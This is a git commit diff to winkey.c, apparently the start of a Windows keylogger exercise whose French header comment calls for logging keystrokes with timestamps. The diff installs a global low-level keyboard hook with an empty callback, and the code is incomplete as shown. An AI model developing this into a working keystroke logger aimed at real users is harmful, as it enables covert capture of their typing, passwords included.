6e9fce6055b809c37b06ea363ce96ed4c9b8df11
H3XploR <73852348+H3XploR@users.noreply.github.com>
2026-03-27 22:26:25 +0100

    util;iser les hook windows

--- winkey.c
+++ winkey.c
@@ -8,10 +8,22 @@
  *	-Tout ces infos doivent etre stocker dans un fichier de log avec l'horaire des logs
  *	-Evidement le logs logs doivent etre lisible par un humain
  */
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, wParam, lParam){
+
+}
+
 int main(void){
 	BOOL is_running = 1;
 	HWND	hdWindowForeground = GetFocus();
 	HHOOK	HookFgWind = SetWindowsHookExA(WH_KEYBOARD_LL,
-						
+						LowLevelKeyboardProc,
+						NULL,
+						0);
+	if (HookFgWind == NULL){
+		printf("Le hook est nul\n");
+		return 1;
+	}
+	printf("Le hook est bon\n");
 	return 0;
 }
